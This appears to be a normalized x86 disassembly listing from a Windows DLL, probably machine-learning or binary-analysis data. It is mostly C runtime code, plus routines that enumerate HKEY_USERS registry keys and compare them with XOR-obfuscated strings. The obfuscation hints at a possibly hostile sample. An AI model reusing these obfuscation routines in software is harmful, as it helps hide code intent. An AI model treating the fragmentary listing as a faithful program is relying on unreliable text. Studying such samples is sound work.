sub eax ecx
push esi
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006c8f0
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax 0x104
sub eax ecx
push esi
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006c8f0
test eax eax
mov edx [ ebp + 0x18 ]
test edx edx
je r-xdata
pop edi
pop esi
mov eax 0x6
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
pop edi
pop esi
mov eax 0x4
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea ecx [ ebp + 0xc ]
push ecx
call sub_1003b1ca
mov ecx [ ebp + 0xc ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x120 ]
mov [ ebp + 0xc ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ecx [ ecx + eax + 0x11c7c ]
push ecx
mov esi 0x104
call sub_1003d910
test eax eax
je r-xdata
mov eax edx
lea esi [ eax + 0x2 ]
mov eax edx
lea esi [ eax + 0x2 ]
cmp [ ebp + 0x10 ] 0x0
je r-xdata
pop edi
pop esi
mov eax 0x8
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp + 0xc ]
push edx
call sub_1003b1ca
mov esi [ ebp + 0xc ]
mov eax 0xcccccccd
mul esi
shr edx 0x3
imul edx edx 0xfffffff6
add esi edx
mov edx [ ebp + 0x1c ]
add esp 0x4
mov [ ebp + 0xc ] esi
test edx edx
je r-xdata
push edx
mov esi 0x104
call sub_1003d910
test eax eax
je r-xdata
push edx
mov esi 0x104
call sub_1003d910
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
imul esi esi 0x208
mov ecx [ eax + 0x120 ]
lea edx [ esi + ecx + 0x1451c ]
push edx
mov esi 0x104
call sub_1003d910
test eax eax
je r-xdata
mov eax edx
lea edi [ eax + 0x2 ]
mov edi edi
pop edi
pop esi
mov eax 0x7
pop ebx
mov esp ebp
pop ebp
retn 0x18
pop edi
pop esi
mov eax 0x5
pop ebx
mov esp ebp
pop ebp
retn 0x18
pop edi
pop esi
mov eax 0xa
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
je r-xdata
push edx
mov esi 0x104
call sub_1003d910
test eax eax
je r-xdata
mov esi [ ebp + 0xc ]
pop edi
pop esi
mov eax 0x9
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_1002f01f
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
test edi edi
jne r-xdata
push esi
call sub_10051dfe
push 0x214
push 0x1
call sub_1000977c
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
xor eax eax
jmp r-xdata
push esi
call sub_10022b5a
pop ecx
test ebx ebx
je r-xdata
call sub_10039c8c
push [ eax + 0x6c ]
push esi
call sub_100028b0
mov eax [ ebp + 0x14 ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x1c ]
pop ecx
pop ecx
mov [ esi + 0x54 ] edi
test eax eax
jne r-xdata
pop edi
pop ebx
pop ebp
retn
xor eax eax
push ebx
call sub_1005df26
pop ecx
push eax
push [ ebp + 0x18 ]
push esi
push sub_10079208
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateThread@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp + 0x10 ]
pop esi
call [ GetLastError@IAT ]
mov ebx eax
sub_1002f0c0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] ecx
call sub_1003c7d0
mov eax [ ebp - 0x20 ]
mov esi 0x8
cmp [ ebp - 0xc ] esi
jae r-xdata
mov edx [ ebp - 0x10 ]
push 0x0
push 0x0
push 0x0
push 0x0
push edx
push eax
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov edi eax
test edi edi
jne r-xdata
lea eax [ ebp - 0x20 ]
push ebx
mov ebx [ GetProcessHeap@IAT ]
lea ecx [ edi + 0x1 ]
push ecx
push esi
call ebx
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp - 0xc ] esi
jb r-xdata
cmp [ ebp - 0xc ] 0x8
mov eax [ ebp - 0x20 ]
jae r-xdata
cmp [ ebp - 0xc ] 0x8
jb r-xdata
pop edi
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x20 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x10 ]
push 0x0
push 0x0
push edi
push esi
push ecx
push eax
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
pop ebx
pop edi
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x20 ]
push edx
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x24 ]
push edi
push esi
push eax
push 0x0
call sub_100248f0
mov ecx [ ebp - 0x28 ]
mov edx [ ecx ]
add esp 0x10
push edx
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
inc ecx
push ecx
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp - 0x28 ]
mov [ edx ] eax
test eax eax
jne r-xdata
push esi
push eax
call ebx
push eax
call [ HeapFree@IAT ]
cmp [ ebp - 0xc ] 0x8
jb r-xdata
mov ecx [ ebp - 0x24 ]
push edi
push esi
push ecx
push eax
call sub_100248f0
add esp 0x10
push esi
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
lea ecx [ ebp - 0x20 ]
call sub_10029c40
mov ecx [ ebp - 0x4 ]
pop ebx
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x20 ]
call sub_10029c40
pop ebx
pop edi
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x20 ]
push edx
call sub_1006591f
add esp 0x4
sub_1002f261
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_1002f300
push ebp
mov ebp esp
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
lea eax [ ebp - 0x220 ]
push eax
push 0x8
push 0x0
push 0x0
push 0x80000003
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ebx [ RegEnumKeyExW@IAT ]
xor esi esi
mov edi edi
mov ecx [ ebp - 0x220 ]
push ecx
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x21c ]
push eax
call [ CharUpperW@IAT ]
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x47
and edx 0xff
mov [ ebp + eax * 2 - 0x14 ] dx
inc eax
cmp eax 0x7
jb r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea edx [ ebp - 0x21c ]
xor eax eax
push edx
mov [ ebp - 0x6 ] ax
call sub_1005dcbd
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp - 0x220 ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
inc esi
cmp esi 0x100
jl r-xdata
xor eax eax
movzx edx ax
push 0x0
push 0x0
mov eax edx
shl edx 0x10
push 0x0
or eax edx
mov edx [ ebp - 0x220 ]
push 0x0
mov ecx 0x82
lea edi [ ebp - 0x21c ]
[ edi ]
lea eax [ ebp - 0x224 ]
push eax
lea ecx [ ebp - 0x21c ]
push ecx
push esi
push edx
mov [ ebp - 0x224 ] 0x206
call ebx
test eax eax
jne r-xdata
sub_1002f427
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_10008102
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_10022b5a
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_1002f4c0
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi edx
xor ebx ebx
push edi
mov edi ecx
mov [ ebp - 0xa8 ] eax
lea eax [ esi + 0xc ]
mov [ edi + 0x40 ] ebx
mov [ edi + 0x44 ] ebx
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0xac ] esi
jb r-xdata
mov [ ebp - 0xa4 ] eax
mov ecx [ eax ]
mov [ ebp - 0xa4 ] ecx
jmp r-xdata
mov edx [ ebp - 0xa4 ]
push edx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xa4 ]
push ebx
push ecx
push eax
mov [ edi ] eax
call sub_100796a0
lea eax [ esi + 0x2c ]
add esp 0xc
cmp [ eax + 0x14 ] 0x8
jb r-xdata
push eax
call [ LocalFree@IAT ]
mov [ edi ] ebx
mov eax [ edi ]
cmp eax ebx
je r-xdata
mov [ ebp - 0xa4 ] eax
mov edx [ eax ]
mov [ ebp - 0xa4 ] edx
jmp r-xdata
mov eax [ ebp - 0xa4 ]
push eax
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea ecx [ ebx + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0xa4 ]
push ebx
push edx
push eax
mov [ edi + 0x8 ] eax
call sub_100796a0
mov eax [ esi + 0x28 ]
mov [ edi + 0x20 ] eax
mov ecx [ esi + 0x58 ]
mov [ edi + 0x24 ] ecx
mov edx [ esi + 0x50 ]
mov [ edi + 0x2c ] edx
mov eax [ esi + 0x54 ]
mov [ edi + 0x28 ] eax
mov [ edi + 0x38 ] 0x1
mov ecx [ esi + 0x68 ]
mov [ edi + 0x40 ] ecx
mov edx [ esi + 0x6c ]
mov [ edi + 0x44 ] edx
mov eax [ esi + 0x5c ]
mov [ edi + 0x4c ] eax
mov ecx [ esi + 0x60 ]
mov [ edi + 0x48 ] ecx
mov eax [ esi + 0x48 ]
dec eax
add esp 0xc
cmp eax 0x5
ja r-xdata
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x8 ] 0x0
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0xad
call sub_100050e0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
jmp [ eax * 4 + jump_table_1002f780 ]
lea edx [ ebp - 0x24 ]
push edx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push ebx
lea ecx [ ebp - 0x24 ]
push ecx
push eax
mov [ edi + 0x1c ] eax
call sub_100796a0
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x1c ] 0x0
lea edx [ ebp - 0x48 ]
mov eax 0x106
call sub_100050e0
mov ebx edx
call sub_10054fc0
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0xf5
call sub_100050e0
mov ebx edx
call sub_10054fc0
jmp r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0xc2
call sub_100050e0
mov ebx edx
call sub_10054fc0
jmp r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x60
call sub_100050e0
mov ebx edx
call sub_10054fc0
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x115
call sub_100050e0
mov ebx edx
call sub_10054fc0
jmp r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x118
call sub_100050e0
mov ebx edx
call sub_10054fc0
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x51
and edx 0xff
mov [ ebp + eax * 2 - 0x38 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x26 ] ax
mov eax [ ebp - 0xa8 ]
mov ebx [ eax ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
jmp r-xdata
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
push eax
call [ LocalFree@IAT ]
mov edx [ esi + 0x58 ]
push edx
lea edx [ ebp - 0x38 ]
lea esi [ ebp - 0x18 ]
call sub_1000ac20
mov eax esi
push eax
lea eax [ edi + 0x54 ]
call sub_10007a30
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] r--data
test eax eax
je r-xdata
mov ecx [ ebp - 0xa8 ]
add ebx 0x1c
cmp ebx [ ecx + 0x4 ]
jne r-xdata
push eax
call [ LocalFree@IAT ]
mov esi [ ebp - 0xac ]
sub_1002f7c4
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_1002ada5
mov [ eax ] ebx
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1001d849
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
mov cl [ eax + esi + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_1002ada5
mov [ eax ] ebx
call sub_1004fd6f
mov [ eax ] 0x9
jmp r-xdata
call sub_1002ada5
mov [ eax ] ebx
call sub_1004fd6f
mov [ eax ] 0x16
mov [ ebp - 0xc ] ebx
cmp edx ebx
je r-xdata
call sub_1001d849
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + esi + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_10008102
mov ebx eax
pop ecx
mov [ ebp - 0x10 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
mov eax ebx
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_100202ee
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_1004fd6f
mov [ eax ] 0xc
call sub_1002ada5
mov [ eax ] 0x8
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
js r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1002ada5
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x0
mov [ ebx ] cl
mov ecx [ edi ]
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_1005df26
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0xc ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp ecx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp ecx 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
add ebx 0x2
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
add ebx 0x2
add eax 0x2
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x10 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
add ecx 0x2
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0xc ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_100202ee
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_100202ee
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
add ebx 0x2
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_100202ee
add esp 0x10
inc ebx
mov [ ecx + esi + 0x5 ] dl
cmp eax 0x2
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_1002fd7b
mov edi edi
push ebp
mov ebp esp
mov dx [ ebp + 0xc ]
push esi
cmp [ ebp + 0x10 ] dx
ja r-xdata
cmp [ ebp + 0x14 ] dx
ja r-xdata
movzx ecx [ ebp + 0x10 ]
movzx eax dx
lea esi [ ecx + 0x9 ]
cmp eax esi
jg r-xdata
cmp [ ebp + 0x18 ] dx
ja r-xdata
movzx ecx [ ebp + 0x14 ]
movzx eax dx
lea esi [ ecx + 0x5 ]
cmp eax esi
jg r-xdata
sub eax ecx
jmp r-xdata
or eax 0xffffffff
movzx ecx [ ebp + 0x18 ]
movzx eax dx
lea edx [ ecx + 0x5 ]
cmp eax edx
jle r-xdata
sub eax ecx
add eax 0xa
jmp r-xdata
pop esi
pop ebp
retn
sub_1002fdd2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003812f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_1002fe00
push ebp
mov ebp esp
push 0xffffffff
push sub_10082540
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + edi + 0xc ]
add ecx edi
test eax eax
jne r-xdata
mov eax [ ecx + 0xc ]
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x3c ]
test ecx ecx
je r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
mov edx [ edi ]
mov ecx [ edx + 0x4 ]
add ecx edi
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov esi ecx
call sub_100537f0
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0x0
call sub_1003c700
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_1002fec0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_1006a508
mov ebx [ ebp + 0x8 ]
